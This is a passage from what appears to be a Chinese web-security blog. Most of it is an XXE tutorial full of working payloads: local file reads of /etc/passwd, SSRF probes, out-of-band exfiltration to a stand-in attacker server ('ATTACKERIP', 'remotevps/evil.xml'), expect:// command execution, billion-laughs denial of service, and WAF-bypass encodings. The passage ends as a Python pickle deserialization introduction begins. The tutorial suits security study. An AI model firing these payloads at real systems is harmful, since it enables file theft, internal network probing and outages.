&quot;file:///etc/passwd&quot;&gt;</span><br><span class="line">        %name;</span><br><span class="line">    ]&gt;</span><br></pre></td></tr></table></figure><p><strong>注意：%name（参数实体）是在DTD中被引用的，而&amp;name（其余实体）是在xml文档中被引用的</strong></p><p>由于xxe漏洞主要是利用了DTD引用外部实体导致的漏洞，那么重点看下能引用哪些类型的外部实体。</p><p><strong>外部实体</strong></p><p>外部实体即在DTD中使用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY 实体名称 SYSTEM &quot;URI&quot;&gt;</span><br></pre></td></tr></table></figure><p>语法引用外部的实体，而非内部实体，那么URL中能写哪些类型的外部实体呢？<br>主要的有file、http、https、ftp等等，当然不同的程序支持的不一样：</p><p><img src="/img/XXE-XML%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5/xxe_02.png" alt=""></p><p>php安装扩展后还能支持的一些协议：</p><p><img src="/img/XXE-XML%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5/xxe_03.png" alt=""></p><h1 id="XXE检测"><a href="#XXE检测" class="headerlink" title="XXE检测"></a>XXE检测</h1><p>检测是否有外带：</p><ul><li><a href="http://ceye.io/payloads">CEYE</a></li><li><a href="http://dnslog.cn/">DNSLog</a></li></ul><p>主要的方法是检测所有接受XML作为输入内容端点，抓包观察其是否会返回我们想要的内容。</p><ul><li>首先检测XML是否会被成功解析：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY [</span><br><span class="line">    &lt;!ENTITY words &quot;Hello XXE !&quot;&gt;</span><br><span class="line">    ]&gt;</span><br><span class="line">&lt;root&gt;&amp;words;&lt;/root&gt;</span><br></pre></td></tr></table></figure><p><img src="/img/XXE-XML%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5/xxe_04.png" alt=""></p><p>如果数据包或页面中存在<code>Hello XXE</code>的字样，则表名实体已被解析。</p><ul><li>接下来检测该端点是否支持DTD引用外部实体：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=”1.0” encoding=”UTF-8”?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY [</span><br><span class="line">    &lt;!ENTITY name SYSTEM &quot;http://jmdyc7.dnslog.cn&quot;&gt;</span><br><span class="line">    ]&gt;</span><br><span class="line">&lt;xxe&gt;&amp;name;&lt;/xxe&gt;</span><br></pre></td></tr></table></figure><p>此时通过查看<code>dnslog</code>网站查看是否有请i求信息：</p><p><img src="/img/XXE-XML%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5/xxe_05.png" alt=""></p><p>如图所示，则该处很可能存在XML外部实体注入漏洞。</p><ul><li>通过观察或修改请求头中：Content-Type=&gt;&gt;text/xml或Content-type:application/xml</li></ul><p>许多服务端开发框架(比如基于RESTful服务的JAX-RS)也允许基于数据交换的XML格式作为输入，甚至是输出。如果可以进行这种替换，可以通过修改请求头中的Content-Type的值(比如修改成text/xml或者application/xml)来进行验证触发。即使客户端只能使用JSON格式或者是直接路径或者是参数查询的方式来访问服务。</p><h1 id="XXE利用及payload"><a href="#XXE利用及payload" class="headerlink" title="XXE利用及payload"></a>XXE利用及payload</h1><p>以下利用主要基于<code>libxml2</code>版本，其中libxml是PHP的xml支持。<br>而libxml版本在2.9.1及以后，默认不解析外部实体，很多利用将无法实现。</p><h2 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h2><p><strong>pikachu演示：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE a[</span><br><span class="line">        &lt;!ENTITY hack SYSTEM &quot;file:///c:/windows/win.ini&quot;&gt;</span><br><span class="line">    ]&gt;</span><br><span class="line">&lt;foo&gt;&amp;hack;&lt;/foo&gt;</span><br></pre></td></tr></table></figure><p><img src="/img/XXE-XML%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5/xxe_06.png" alt=""></p><p>文件读取的利用和payload非常好理解，即使用file协议读取文件内容，并输出到页面上（有回显的情况）</p><h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><p>XXE 可以与SSRF（服务端请求伪造） 漏洞一起用于探测其它内网主机的信息，基于http协议。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">    &lt;!ELEMENT foo ANY &gt;</span><br><span class="line">    &lt;!ENTITY % xxe SYSTEM &quot;http://internal.service/secret_pass.txt&quot; &gt;</span><br><span class="line">    ]&gt;</span><br><span class="line">&lt;foo&gt;&amp;xxe;&lt;/foo&gt;</span><br></pre></td></tr></table></figure><p>当然也可以用来探测端口信息，根据响应包的信息，若非<code>connection refused</code>则表示该端口可能是开放的。</p><p>众所周知，有些企业对内网的安全性可能不那么注重。除了以上的利用，控制服务器对外网发送请求也是有可能成功的。此处可使用ncat工具进行测试。</p><p>关于ncat的使用：<a href="https://blog.51cto.com/executer/2074434">ncat-网络工具中的‘瑞士军刀’</a></p><p>ncat在自己的服务器上开启监听：ncat -lvkp 9999(端口可自定义)</p><p>之后便可使用以下语句尝试是否能够建立连接：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE data SYSTEM &quot;http://ATTACKERIP:9999/&quot; [</span><br><span class="line">    &lt;!ELEMENT data (#PCDATA)&gt;</span><br><span class="line">    ]&gt;</span><br><span class="line">&lt;data&gt;4&lt;/data&gt;</span><br></pre></td></tr></table></figure><p>如果能够建立连接，那么服务器端的ncat会收到相应的请求信息。</p><h2 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h2><p>在安装expect扩展的PHP环境里执行系统命令，当然其他协议也有可能可以执行系统命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE xxe [</span><br><span class="line">    &lt;!ELEMENT name ANY &gt;</span><br><span class="line">    &lt;!ENTITY xxe SYSTEM &quot;expect://id&quot; &gt;</span><br><span class="line">    ]&gt;</span><br><span class="line">&lt;root&gt;</span><br><span class="line">&lt;name&gt;&amp;xxe;&lt;/name&gt;&lt;</span><br><span class="line">/root&gt;</span><br></pre></td></tr></table></figure><h2 id="DDoS"><a href="#DDoS" class="headerlink" title="DDoS"></a>DDoS</h2><p>支持实体测试：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE data [</span><br><span class="line">    &lt;!ELEMENT data (#ANY)&gt;</span><br><span class="line">    &lt;!ENTITY a0 &quot;dos&quot; &gt;</span><br><span class="line">    &lt;!ENTITY a1 &quot;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&quot;&gt;</span><br><span class="line">    &lt;!ENTITY a2 &quot;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&quot;&gt;</span><br><span class="line">    ]&gt;</span><br><span class="line">&lt;data&gt;&amp;a2;&lt;/data&gt;</span><br></pre></td></tr></table></figure><p>如果解析过程变的非常缓慢，则表明测试成功，即目标解析器配置不安全可能遭受至少一种 DDoS 攻击。</p><h2 id="Billion-Laughs-攻击"><a href="#Billion-Laughs-攻击" class="headerlink" title="Billion Laughs 攻击"></a>Billion Laughs 攻击</h2><p>一个经典的Dos攻击payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE lolz [</span><br><span class="line">    &lt;!ENTITY lol &quot;lol&quot;&gt;</span><br><span class="line">    &lt;!ELEMENT lolz (#PCDATA)&gt;</span><br><span class="line">    &lt;!ENTITY lol1 &quot;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&quot;&gt;</span><br><span class="line">    &lt;!ENTITY lol2 &quot;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&quot;&gt;</span><br><span class="line">    &lt;!ENTITY lol3 &quot;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&quot;&gt;</span><br><span class="line">    ......</span><br><span class="line">    &lt;!ENTITY lol9 &quot;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&quot;&gt;</span><br><span class="line">    ]&gt;</span><br><span class="line">&lt;lolz&gt;&amp;lol9;&lt;/lolz&gt;</span><br></pre></td></tr></table></figure><p>当XML解析器加载该文档时，它会看到它包含一个根元素“lolz”，该元素包含文本“&lol9;”。然而，“&lol9;”是一个已定义的实体，它扩展为包含十个“&lol8;”字符串。每个“&lol8;”字符串都是一个已定义的实体，可以扩展到10个“&lol7;”字符串，以此类推。在处理完所有的实体扩展之后，这个小(小于1 KB)的XML块实际上将包含109 = 10亿个“lol”，占用了将近3 gb的内存。</p><h2 id="Blind-XXE"><a href="#Blind-XXE" class="headerlink" title="Blind XXE"></a>Blind XXE</h2><p>Blind XXE，字面意思也就是提交xml的服务器端点不再返回有效的数据，此时我们前面的一些利用方法就要失效了。但是解决方法还是有的</p><h3 id="XXE-OOB-外带数据通道"><a href="#XXE-OOB-外带数据通道" class="headerlink" title="XXE OOB(外带数据通道)"></a>XXE OOB(外带数据通道)</h3><p><strong>概念</strong></p><p>带外数据(out—of—band data)，有时也称为加速数据(expedited data)，<br>是指连接双方中的一方发生重要事情，想要迅速地通知对方。这种通知在已经排队等待发送的任何“普通”(有时称为“带内”)数据之前发送。带外数据设计为比普通数据有更高的优先级。</p><p>类似dnslog，或http访问构造，达成效果</p><p>带外数据是映射到现有的连接中的，而不是在客户机和服务器间再用一个连接。</p><p><strong>利用</strong></p><p>带外数据通道的建立是使用嵌套形式，利用外部实体中的URL发出访问，从而跟攻击者的服务器发生联系。但有些情况下不能在实体定义中引用参数实体，即有些解释器不允许在内层实体中使用外部连接，无论内层是一般实体还是参数实体。</p><p>将嵌套的实体声明放入到一个外部文件中，这里一般是放在攻击者的服务器上，这样做可以规避错误。<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY[</span><br><span class="line">    &lt;!ENTITY % file SYSTEM &quot;file:///C:/1.txt&quot;&gt;</span><br><span class="line">    &lt;!ENTITY % remote SYSTEM &quot;http://remotevps/evil.xml&quot;&gt;</span><br><span class="line">    %remote;</span><br><span class="line">        %all;</span><br><span class="line">    ]&gt;</span><br><span class="line">&lt;root&gt;&amp;send;&lt;/root&gt;</span><br></pre></td></tr></table></figure></p><p>evil.xml：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % all &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;http://remotevps/1.php?file=%file;&#x27;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure><p>实体remote，all，send的引用顺序很重要，首先对remote引用目的是将外部文件evil.xml引入到解释上下文中，然后执行%all，这时会检测到send实体，在root节点中引用send，就可以成功实现数据转发。当请求发送以后，攻击者的服务器上就能查看到1.txt中的内容。</p><h3 id="基于错误的XXE"><a href="#基于错误的XXE" class="headerlink" title="基于错误的XXE"></a>基于错误的XXE</h3><p>形同blind xxe，当我们成功地让服务端解析了xml文档，得到的响应却是通用的。比如添加账号的时候只返回“添加成功”这样的响应。此时我们可以让服务器响应报错信息来得到我们要的敏感数据</p><p>有两种报错的来源：</p><ul><li>DTD结构的错误</li><li>XML架构验证时的错误</li></ul><p><strong>外部DTD</strong></p><p>在本例中，我们将让服务器加载一个恶意DTD，它将在错误消息中显示文件的内容(只有当可以看到错误消息时，这才有效)。</p><p>可以使用恶意的外部DTD触发包含/etc/passwd文件内容的XML解析错误消息，如下所示:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line">&lt;!ENTITY % eval &quot;&lt;!ENTITY &amp;#x25; error SYSTEM &#x27;file:///nonexistent/%file;&#x27;&gt;&quot;&gt;</span><br><span class="line">%eval;</span><br><span class="line">%error;</span><br></pre></td></tr></table></figure><p>这个DTD执行以下步骤:</p><p>定义一个名为file的XML参数实体，其中包含<code>/etc/passwd</code>文件的内容。</p><p>定义一个名为eval的XML参数实体，包含另一个名为error的XML参数实体的动态声明。错误实体将通过加载一个不存在的文件来评估，该文件的名称包含文件实体的值。</p><p>使用eval实体，该实体将导致执行错误实体的动态声明。</p><p>使用错误实体，以便通过尝试加载不存在的文件来得到数据，从而导致返回包含不存在文件的名称的错误消息，该名称正是<code>/etc/passwd</code>文件的内容。</p><p>==注意：==外部DTD允许我们在第二个(eval)中包含一个实体，但在内部DTD中是禁止的。因此，在不允许使用外部DTD的情况下(通常)强制执行错误是行不通的。</p><p><strong>内外部DTD混合</strong></p><p>那么，当带外交互被阻止(外部连接不可用)时， blind XXE漏洞怎么办?</p><p>在这种情况下，由于XML语言规范中的漏洞，仍然有可能触发包含敏感数据的错误消息。如果文档的DTD混合使用内部和外部DTD声明，那么内部DTD可以重新定义在外部DTD中声明的实体。当发生这种情况时，在另一个参数实体的定义中使用XML参数实体的限制就放宽了。</p><p>这意味着攻击者可以从内部DTD中使用基于错误的XXE技术，前提是他们使用的XML参数实体是重新定义在外部DTD中声明的实体。当然，如果带外连接被阻塞，那么就不能从远程位置加载外部DTD。相反，它需要是应用服务器本地的外部DTD文件。从本质上说，攻击涉及调用碰巧存在于本地文件系统上的DTD文件，并将其重新用于重定义现有实体，从而触发包含敏感数据的解析错误。</p><p>例如，假设服务器文件系统上位于位置<code>/usr/local/app/schema</code>上有一个DTD文件这个dtd文件定义了一个名为<code>custom_entity</code>的实体。攻击者可以通过提交如下混合DTD来触发包含<code>/etc/passwd</code>文件内容的XML解析错误消息:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">    &lt;!ENTITY % local_dtd SYSTEM &quot;file:///usr/local/app/schema.dtd&quot;&gt;</span><br><span class="line">    &lt;!ENTITY % custom_entity &#x27;</span><br><span class="line">            &lt;!ENTITY &amp;#x25; file SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line">            &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///nonexistent/&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;</span><br><span class="line">            &amp;#x25;eval;</span><br><span class="line">            &amp;#x25;error;</span><br><span class="line">            &#x27;&gt;</span><br><span class="line">        %local_dtd;</span><br><span class="line">    ]&gt;</span><br></pre></td></tr></table></figure></p><p>这个DTD执行以下步骤:<br>定义名为<code>local_dtd</code>的XML参数实体，其中包含存在于服务器文件系统上的外部DTD文件的内容。<br>重新定义名为<code>custom_entity</code>的XML参数实体，该实体已经在外部DTD文件中定义。实体被重新定义为包含前面描述的基于错误的XXE漏洞，用于触发包含<code>/etc/passwd</code>文件内容的错误消息。<br>使用<code>local_dtd</code>实体，以便解释外部DTD，包括重新定义的<code>custom_entity</code>实体的值。这将导致所需的错误消息。</p><p>可以安装相同的服务器正在使用的操作系统/软件和搜索一些默认dtd，或抓取系统内的默认dtd列表，并检查其中是否存在</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">    &lt;!ENTITY % local_dtd SYSTEM &quot;file:///usr/share/yelp/dtd/docbookx.dtd&quot;&gt;</span><br><span class="line">    %local_dtd;</span><br><span class="line">    ]&gt;</span><br></pre></td></tr></table></figure><h2 id="XInclude攻击"><a href="#XInclude攻击" class="headerlink" title="XInclude攻击"></a>XInclude攻击</h2><p>xinclude可以理解为xml include</p><p>结合文件包含</p><p>要执行XInclude攻击，需要引用XInclude名称空间并提供希望包含的文件的路径。例如:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">productId=</span><br><span class="line">&lt;foo xmlns:xi=&quot;http://www.w3.org/2001/XInclude&quot;&gt;</span><br><span class="line">&lt;xi:include parse=&quot;text&quot; href=&quot;file:///etc/passwd&quot;/&gt;</span><br><span class="line">&lt;/foo&gt;</span><br><span class="line">&amp;storeId=1</span><br></pre></td></tr></table></figure><h2 id="XSTL攻击"><a href="#XSTL攻击" class="headerlink" title="XSTL攻击"></a>XSTL攻击</h2><p>XSLT（扩展样式表转换语言）是一种对 XML 文档进行转化的语言。XML 文档通过 XSLT 转化后可以变成为另一份不同的 XML 文档，或者其他类型的文档，例如 HTML 文档、 CSV 文件、纯文本文件等。</p><p>有关具体的转化过程，请参考：<a href="http://www.w3school.com.cn/xsl/xsl_transformation.asp">sourse</a></p><p>因为同样具有XML文档，那也有XXE的漏洞隐患。关于具体的应用，可参考文章：<a href="https://bbs.pediy.com/thread-222921.htm">sourse</a></p><h1 id="XXE-Bypass"><a href="#XXE-Bypass" class="headerlink" title="XXE Bypass"></a>XXE Bypass</h1><h2 id="上传文件绕过"><a href="#上传文件绕过" class="headerlink" title="上传文件绕过"></a>上传文件绕过</h2><p>有些应用程序允许用户上传文件，然后在服务器端处理这些文件。一些常见的文件格式使用XML或包含XML子组件。基于xml的格式包括DOCX这样的办公文档格式和SVG这样的图像格式。</p><p>例如，应用程序可能允许用户上传图像，并在上传后在服务器上处理或验证这些图像。即使应用程序希望接收PNG或JPEG之类的格式，所使用的图像处理库也可能支持SVG图像。由于SVG格式使用XML，攻击者可以提交恶意的SVG图像，从而达到针对XXE漏洞的隐藏攻击面。<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; xmlns:xlink=&quot;http://www.w3.org/1999/xlink&quot; width=&quot;300&quot; version=&quot;1.1&quot; height=&quot;200&quot;&gt;</span><br><span class="line">&lt;image xlink:href=&quot;file:///etc/hostname&quot;&gt;&lt;/image&gt;</span><br><span class="line">&lt;/svg&gt;</span><br></pre></td></tr></table></figure></p><p>另外，许多常见的文档格式，例如doc，docx，odt等，其实质是一个zip文件，其中包含xml文件。当我们用winrar、7z等工具打开这类文件就能看到</p><p>我们可以利用这些文件来绕过xxe防御。 <a href="https://github.com/BuffaloWill/oxml_xxe">oxml_xxe</a>就是一个用于向此类文件中嵌入XXE Payload的工具。它支持以下文件格式的创建或修改：</p><ul><li>DOCX/XLSX/PPTX</li><li>ODT/ODG/ODP/ODS</li><li>SVG</li><li>XML</li><li>PDF (experimental)</li><li>JPG (experimental)</li><li>GIF (experimental)</li></ul><p>oxml_xxe的工作原理分为两种：</p><ol><li>直接建立一个文件，该模式会自动添加DOCTYPE并将XML实体插入到用户选择的文件中。</li><li>替换文件中的字符串，此模式会遍历查找文档中的符号§。并用XML实体(“&xxe;”)替换此符号的所有实例。注意，你可以在任何地方打开文档并插入§来替换它。常见的用例是web应用程序，它读取xlsx，然后将结果打印到屏幕上。利用XXE我们便可以将内容打印到屏幕上。</li></ol><h2 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h2><p><strong>base64</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE test [ &lt;!ENTITY % init SYSTEM &quot;data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk&quot;&gt; %init; ]&gt;&lt;foo/&gt;</span><br></pre></td></tr></table></figure><p>仅当XML服务器接受data://协议时，此方法才有效。</p><p><strong>utf-7</strong></p><p>举例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!xml version=&quot;1.0&quot; encoding=&quot;UTF-7&quot;?--&gt;+ADw-+ACE-DOCTYPE+ACA-foo+ACA-+AFs-+ADw-+ACE-ENTITY+ACA-example+ACA-SYSTEM+ACA-+ACI-/etc/passwd+ACI-+AD4-+ACA-+AF0-+AD4-+AAo-+ADw-stockCheck+AD4-+ADw-productId+AD4-+ACY-example+ADs-+ADw-/productId+AD4-+ADw-storeId+AD4-1+ADw-/storeId+AD4-+ADw-/stockCheck+AD4-</span><br></pre></td></tr></table></figure><p><strong>使用两种编码</strong></p><p>在同一个文档里同时使用两种编码，从而迷惑 WAF，说明：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo -n &#x27;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-16BE&quot;?&gt;&#x27; &gt; payload.xmlecho &#x27;&lt;a&gt;1337&lt;/a&gt;&#x27; | iconv -f UTF-8 -t UTF-16BE &gt;&gt; payload.xml</span><br></pre></td></tr></table></figure><p>头部声明使用 UTF-8 编码，而之后使用 UTF-16 编码。当解析器读到 XML 声明的编码时，会切换到该编码（继续解析），即使该编码与声明部分所使用的编码不同。与此同时，WAF 一般不支持这种多种编码的 XML 文档</p><p><strong>在实体内编码</strong></p><p>是新的XML技术，对内部实体中的任何DTD/XML进行编码（编码格式是字符串16进制+UTF-8形式），达到WAF bypass的效果！<br>当没有XXE，但XML主体中存在漏洞(例如SQL注入)时起作用</p><p><img src="/img/XXE-XML%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5/xxe_07.png" alt=""></p><p><strong>文档中的额外空格</strong></p><p>由于XXE通常在XML文档的开头，所以比较省事儿的WAF可以避免处理整个文档，而只解析它的开头。但是，XML格式允许在格式化标记属性时使用任意数量的空格，因此攻击者可以在<code>&lt;?xml?&gt;</code>或<code>&lt;!DOCTYPE&gt;</code>中插入额外的空格，从而绕过此类WAF</p><h1 id="XXE工具"><a href="#XXE工具" class="headerlink" title="XXE工具"></a>XXE工具</h1><h2 id="XXEinjector"><a href="#XXEinjector" class="headerlink" title="XXEinjector"></a>XXEinjector</h2><p>XXEinjector是一个使用Ruby编写的自动化xxe漏洞检测工具，可以通过给定一个http请求的包，然后设置好好参数就会自动化的进行fuzz，他会通过内置的规则进行自动化的测试，并且还支持二次注入（通过另一个请求触发漏洞）。</p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XXE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python反序列化</title>
      <link href="/2023/07/30/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2023/07/30/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><ul><li><p><code>Python</code>的序列化和反序列化是将一个类对象向字节流转化从而进行存储和传输, 然后使用的时候再将字节流转化回原始的对象的一个过程, 这个和其他语言的序列化与反序列化其实都差不多.</p></li><li><p><code>Python</code>中序列化一般有两种方式: <code>pickle</code>模块和<code>json</code>模块, 前者是<code>Python</code>特有的格式, 后者是<code>json</code>通用的格式.</p></li><li><p>相较于<code>PHP</code>反序列化灵活多样的利用方式, 例如<code>POP</code>链构造, <code>Phar</code>反序列化, 原生类反序列化以及字符逃逸等. <code>Python</code>相对而言没有<code>PHP</code>那么灵活, 关于反序列化漏洞主要涉及这么几个概念: <code>pickle</code>, <code>pvm</code>, <code>__reduce__</code>魔术方法. 本文主要来看看<code>pickle</code>模块的反序列化漏洞问题.</p></li></ul><h1 id="Pickle"><a href="#Pickle" class="headerlink" title="Pickle"></a>Pickle</h1><h2 id="简介-1"><a href="#简介-1" class="headerlink" title="简介"></a>简介</h2><p><code>Pickle</code>可以用于<code>Python</code>特有的类型和<code>Python</code>的数据类型间进行转换(所有<code>Python</code>数据类型).</p><p><code>Python</code>提供两个模块来实现序列化: <code>cPickle</code>和<code>pickle</code>. 这两个模块功能是一样的, 区别在于<code>cPickle</code>是<code>C</code>语言写的, 速度快; <code>pickle</code>是纯<code>Python</code>写的, 速度慢. 在<code>Python3</code>中已经没有<code>cPickle</code>模块. <code>pickle</code>有如下四种操作方法:</p><div class="table-container"><table><thead><tr><th>函数</th><th>说明</th></tr></thead><tbody><tr><td>dump</td><td>对象反序列化到文件对象并存入文件</td></tr><tr><td>dumps</td><td>对象反序列化为 bytes 对象</td></tr><tr><td>load</td><td>对象反序列化并从文件中读取数据</td></tr><tr><td>loads</td><td>从 bytes 对象反序列化</td></tr></tbody></table></div><h2 id="简单使用"><a href="#简单使用" class="headerlink" title="简单使用"></a>简单使用</h2><h3 id="序列化操作"><a href="#序列化操作" class="headerlink" title="序列化操作"></a>序列化操作</h3><p><strong>代码：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Demo</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name=<span class="string">&#x27;SpongeBob&#x27;</span></span>):</span><br><span class="line">        self.name = name</span><br><span class="line"><span class="built_in">print</span>(pickle.dumps(Demo()))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;\x80\x04\x95/\x00\x00\x00\x00\x00\x00\x00\x8c\x08__main__\x94\x8c\x04Demo\x94\x93\x94)\x81\x94&#125;\x94\x8c\x04name\x94\x8c\tSpongeBob\x94sb.&#x27;</span></span><br></pre></td></tr></table></figure><p>输出的一大串字符实际上是一串<code>PVM</code>操作码, 可以在<code>pickle.py</code>中看到关于这些操作码的详解.</p><p><img src="/img/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/python.png" alt=""></p><h3 id="反序列化操作"><a href="#反序列化操作" class="headerlink" title="反序列化操作"></a>反序列化操作</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Demo</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name=<span 